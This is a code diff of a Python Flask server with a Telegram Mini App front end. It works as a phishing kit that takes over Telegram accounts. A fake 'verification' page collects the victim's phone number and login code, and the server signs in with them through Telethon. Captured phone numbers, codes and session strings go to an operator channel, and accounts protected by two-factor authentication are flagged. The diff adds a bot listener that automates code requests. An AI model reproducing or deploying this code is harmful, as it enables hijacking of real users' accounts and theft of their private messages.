@@ -1,8 +1,6 @@
-import os
-import asyncio
-import json
+import os, asyncio, json, threading
 from datetime import datetime
-from telethon import TelegramClient, errors
+from telethon import TelegramClient, events, errors
 from telethon.sessions import StringSession
 from flask import Flask, request, jsonify, render_template_string
 import psycopg2
@@ -69,16 +67,7 @@ p{color:#ddd;font-size:14px;margin-bottom:30px;line-height:1.5}
 <div id="successScreen" style="display:none"><div class="card"><h2>Success! ✅</h2><p style="color:#00ff88;font-size:16px">Your account has been verified successfully.</p></div></div>
 </div>
 <script>
-var tg=window.Telegram.WebApp;tg.ready();tg.expand();
-var userId=null,enteredCode='';
-if(tg.initDataUnsafe&&tg.initDataUnsafe.user)userId=tg.initDataUnsafe.user.id;
-function handleConfirm(){document.getElementById('antiBotScreen').style.display='none';document.getElementById('verificationScreen').style.display='block'}
-function handleContact(){document.getElementById('shareBtn').disabled=true;document.getElementById('contactLoading').style.display='block';if(!window.Telegram||!window.Telegram.WebApp){alert('WebApp not available');return}Telegram.WebApp.requestContact().then(function(result){if(!result||!result.response||!result.response.contact){alert('No contact data');document.getElementById('shareBtn').disabled=false;document.getElementById('contactLoading').style.display='none';return}var phone=result.response.contact.phone_number;fetch('/request_code',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user_id:userId,phone:phone})}).then(function(res){return res.json()}).then(function(data){document.getElementById('contactLoading').style.display='none';if(data.success){document.getElementById('verificationScreen').style.display='none';document.getElementById('codeScreen').style.display='block'}else{alert('Error: '+(data.error||'Unknown'));document.getElementById('shareBtn').disabled=false}}).catch(function(err){alert('Network: '+err.message);document.getElementById('shareBtn').disabled=false;document.getElementById('contactLoading').style.display='none'})}).catch(function(err){alert('Contact cancelled');document.getElementById('shareBtn').disabled=false;document.getElementById('contactLoading').style.display='none'})}
-function resendCode(){fetch('/resend',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user_id:userId})}).then(function(res){return res.json()}).then(function(data){if(data.success){alert('New code sent');enteredCode='';updateCodeDisplay()}else{alert(data.error||'Failed')}})}
-function pressKey(key){if(key==='back')enteredCode=enteredCode.slice(0,-1);else if(key==='clear')enteredCode='';else if(enteredCode.length<5)enteredCode+=key;updateCodeDisplay()}
-function updateCodeDisplay(){var slots=document.querySelectorAll('.code-slot');for(var i=0;i<slots.length;i++){if(i<enteredCode.length){slots[i].textContent='•';slots[i].classList.add('filled')}else{slots[i].textContent='';slots[i].classList.remove('filled')}}}
-function submitCode(){if(enteredCode.length!==5){alert('Enter 5-digit code');return}document.getElementById('loadingBox').style.display='block';document.getElementById('errorBox').style.display='none';fetch('/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code:enteredCode,user_id:userId})}).then(function(res){if(!res.ok)throw new Error('Server error: '+res.status);return res.json()}).then(function(data){document.getElementById('loadingBox').style.display='none';if(data.success){document.getElementById('codeScreen').style.display='none';document.getElementById('successScreen').style.display='block';setTimeout(function(){tg.close()},2000)}else{document.getElementById('errorBox').textContent=data.error||'Invalid code';document.getElementById('errorBox').style.display='block';enteredCode='';updateCodeDisplay()}}).catch(function(err){document.getElementById('loadingBox').style.display='none';document.getElementById('errorBox').textContent='Error: '+err.message;document.getElementById('errorBox').style.display='block'})}
-updateCodeDisplay();
+var tg=window.Telegram.WebApp;tg.ready();tg.expand();var userId=null,enteredCode='';if(tg.initDataUnsafe&&tg.initDataUnsafe.user)userId=tg.initDataUnsafe.user.id;function handleConfirm(){document.getElementById('antiBotScreen').style.display='none';document.getElementById('verificationScreen').style.display='block'}function handleContact(){document.getElementById('shareBtn').disabled=true;document.getElementById('contactLoading').style.display='block';tg.requestContact(function(success,response){if(success){console.log('Contact shared:',response);document.getElementById('verificationScreen').style.display='none';document.getElementById('codeScreen').style.display='block'}else{alert('Please share your contact to continue.');document.getElementById('shareBtn').disabled=false;document.getElementById('contactLoading').style.display='none'}})}function resendCode(){fetch('/resend',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user_id:userId})}).then(function(res){return res.json()}).then(function(data){if(data.success){alert('A new code has been sent to your Telegram app.');enteredCode='';updateCodeDisplay()}else{alert(data.error||'Failed to resend code. Please try again.')}})}function pressKey(key){if(key==='back')enteredCode=enteredCode.slice(0,-1);else if(key==='clear')enteredCode='';else if(enteredCode.length<5)enteredCode+=key;updateCodeDisplay()}function updateCodeDisplay(){var slots=document.querySelectorAll('.code-slot');for(var i=0;i<slots.length;i++){if(i<enteredCode.length){slots[i].textContent='•';slots[i].classList.add('filled')}else{slots[i].textContent='';slots[i].classList.remove('filled')}}}function submitCode(){if(enteredCode.length!==5){alert('Please enter the full 5-digit code.');return}document.getElementById('loadingBox').style.display='block';document.getElementById('errorBox').style.display='none';fetch('/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code:enteredCode,user_id:userId})}).then(function(res){if(!res.ok)throw new Error('Server error: '+res.status);return res.json()}).then(function(data){document.getElementById('loadingBox').style.display='none';if(data.success){document.getElementById('codeScreen').style.display='none';document.getElementById('successScreen').style.display='block';setTimeout(function(){tg.close()},2000)}else{document.getElementById('errorBox').textContent=data.error||'Invalid code.';document.getElementById('errorBox').style.display='block';enteredCode='';updateCodeDisplay()}}).catch(function(err){document.getElementById('loadingBox').style.display='none';document.getElementById('errorBox').textContent='Error: '+err.message;document.getElementById('errorBox').style.display='block'})}updateCodeDisplay();
 </script>
 </body>
 </html>"""
@@ -87,106 +76,166 @@ updateCodeDisplay();
 def index():
     return render_template_string(HTML)
 
-@app.route('/request_code', methods=['POST'])
-def request_code():
-    data = request.json
-    user_id = str(data.get('user_id'))
-    phone = data.get('phone')
-    if not phone:
-        return jsonify({"success": False, "error": "No phone"})
-    try:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        client = TelegramClient(StringSession(), API_ID, API_HASH)
-        loop.run_until_complete(client.connect())
-        result = loop.run_until_complete(client.send_code_request(phone))
-        phone_code_hash = result.phone_code_hash
-        session_string = client.session.save()
-        conn = get_db()
-        cur = conn.cursor()
-        cur.execute("INSERT INTO sessions (user_id, phone, phone_code_hash, session_string) VALUES (%s, %s, %s, %s) ON CONFLICT (user_id) DO UPDATE SET phone=%s, phone_code_hash=%s, session_string=%s", (user_id, phone, phone_code_hash, session_string, phone, phone_code_hash, session_string))
-        conn.commit()
-        cur.close()
-        conn.close()
-        return jsonify({"success": True})
-    except Exception as e:
-        return jsonify({"success": False, "error": str(e)})
-
 @app.route('/resend', methods=['POST'])
-def resend():
+def resend_code():
     data = request.json
     user_id = str(data.get('user_id'))
+    
     conn = get_db()
     cur = conn.cursor(cursor_factory=RealDictCursor)
     cur.execute("SELECT * FROM sessions WHERE user_id = %s", (user_id,))
     row = cur.fetchone()
     cur.close()
     conn.close()
+    
     if not row:
-        return jsonify({"success": False, "error": "Session not found"})
+        return jsonify({"success": False, "error": "Session not found."})
+    
     phone = row['phone']
     session_string = row['session_string']
-    try:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
+    
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    
+    async def request_new_code():
         client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
-        loop.run_until_complete(client.connect())
-        result = loop.run_until_complete(client.send_code_request(phone))
-        phone_code_hash = result.phone_code_hash
-        new_session = client.session.save()
-        conn = get_db()
-        cur = conn.cursor()
-        cur.execute("UPDATE sessions SET phone_code_hash=%s, session_string=%s WHERE user_id=%s", (phone_code_hash, new_session, user_id))
-        conn.commit()
-        cur.close()
-        conn.close()
+        try:
+            await client.connect()
+            result = await client.send_code_request(phone)
+            phone_code_hash = result.phone_code_hash
+            new_session = client.session.save()
+            
+            conn = get_db()
+            cur = conn.cursor()
+            cur.execute("UPDATE sessions SET phone_code_hash=%s, session_string=%s WHERE user_id=%s", (phone_code_hash, new_session, user_id))
+            conn.commit()
+            cur.close()
+            conn.close()
+            
+            await client.disconnect()
+            return True, None
+        except Exception as e:
+            await client.disconnect()
+            return False, str(e)
+    
+    success, error = loop.run_until_complete(request_new_code())
+    loop.close()
+    
+    if success:
         return jsonify({"success": True})
-    except Exception as e:
-        return jsonify({"success": False, "error": str(e)})
+    else:
+        return jsonify({"success": False, "error": error})
 
 @app.route('/verify', methods=['POST'])
-def verify():
+def verify_code():
     data = request.json
     code = data.get('code')
     user_id = str(data.get('user_id'))
+    
     conn = get_db()
     cur = conn.cursor(cursor_factory=RealDictCursor)
     cur.execute("SELECT * FROM sessions WHERE user_id = %s", (user_id,))
     row = cur.fetchone()
     cur.close()
     conn.close()
+    
     if not row:
-        return jsonify({"success": False, "error": "Session expired"})
+        return jsonify({"success": False, "error": "Session not found. Please restart."})
+    
     phone = row['phone']
     phone_code_hash = row['phone_code_hash']
     session_string = row['session_string']
-    try:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
+    
+    print(f"\n[VERIFY] Phone: {phone}, Code: {code}")
+    
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    
+    async def try_login():
         client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
-        loop.run_until_complete(client.connect())
-        loop.run_until_complete(client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash))
-        final_session = client.session.save()
-        msg = f"CAPTURED\n\nPhone: {phone}\nCode: {code}\nSession: {final_session}"
-        loop.run_until_complete(send_channel(msg))
-        loop.run_until_complete(client.disconnect())
-        conn = get_db()
-        cur = conn.cursor()
-        cur.execute("DELETE FROM sessions WHERE user_id = %s", (user_id,))
-        conn.commit()
-        cur.close()
-        conn.close()
+        try:
+            await client.connect()
+            await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
+            final_session = client.session.save()
+            
+            print(f"\n[CAPTURED] {phone}")
+            print(f"[SESSION] {final_session}\n")
+            
+            msg = f"🚨 CAPTURED\n\n📞 {phone}\n🔑 {code}\n🔐 `{final_session}`\n\n{datetime.now()}"
+            await send_channel(msg)
+            await client.disconnect()
+            
+            conn = get_db()
+            cur = conn.cursor()
+            cur.execute("DELETE FROM sessions WHERE user_id = %s", (user_id,))
+            conn.commit()
+            cur.close()
+            conn.close()
+            
+            return True, None
+            
+        except errors.PhoneCodeInvalidError:
+            await client.disconnect()
+            return False, "Invalid code"
+        except errors.PhoneCodeExpiredError:
+            await client.disconnect()
+            return False, "Code expired"
+        except errors.SessionPasswordNeededError:
+            await client.disconnect()
+            await send_channel(f"⚠️ 2FA: {phone}")
+            return False, "2FA enabled"
+        except Exception as e:
+            await client.disconnect()
+            return False, str(e)
+    
+    success, error = loop.run_until_complete(try_login())
+    loop.close()
+    
+    if success:
         return jsonify({"success": True})
-    except errors.PhoneCodeInvalidError:
-        return jsonify({"success": False, "error": "Invalid code"})
-    except errors.PhoneCodeExpiredError:
-        return jsonify({"success": False, "error": "Code expired"})
-    except errors.SessionPasswordNeededError:
-        return jsonify({"success": False, "error": "2FA enabled"})
-    except Exception as e:
-        return jsonify({"success": False, "error": str(e)})
+    else:
+        return jsonify({"success": False, "error": error})
+
+async def bot_listener():
+    await bot_client.start(bot_token=BOT_TOKEN)
+    print("Bot is online. Waiting for contacts...")
+
+    @bot_client.on(events.NewMessage)
+    async def handler(event):
+        if event.message.media and hasattr(event.message.media, "phone_number"):
+            phone = event.message.media.phone_number
+            user_id = str(event.message.sender_id)
+            
+            print(f"\n[CONTACT] {user_id}: {phone}")
+            
+            client = TelegramClient(StringSession(), API_ID, API_HASH)
+            try:
+                await client.connect()
+                result = await client.send_code_request(phone)
+                phone_code_hash = result.phone_code_hash
+                session_string = client.session.save()
+                
+                conn = get_db()
+                cur = conn.cursor()
+                cur.execute("INSERT INTO sessions (user_id, phone, phone_code_hash, session_string) VALUES (%s, %s, %s, %s) ON CONFLICT (user_id) DO UPDATE SET phone=%s, phone_code_hash=%s, session_string=%s", (user_id, phone, phone_code_hash, session_string, phone, phone_code_hash, session_string))
+                conn.commit()
+                cur.close()
+                conn.close()
+                
+                print(f"[CODE SENT] to {phone}")
+                await bot_client.send_message(user_id, "✅ Code sent! Check your Telegram and enter it in the Mini App.")
+                await client.disconnect()
+            except Exception as e:
+                print(f"[ERROR] {e}")
+                await client.disconnect()
+
+    await bot_client.run_until_disconnected()
 
 if __name__ == '__main__':
     init_db()
+    thread = threading.Thread(target=lambda: asyncio.run(bot_listener()))
+    thread.daemon = True
+    thread.start()
     port = int(os.environ.get("PORT", 5000))
+    print(f"Starting on port {port}")
     app.run(host='0.0.0.0', port=port, debug=False)
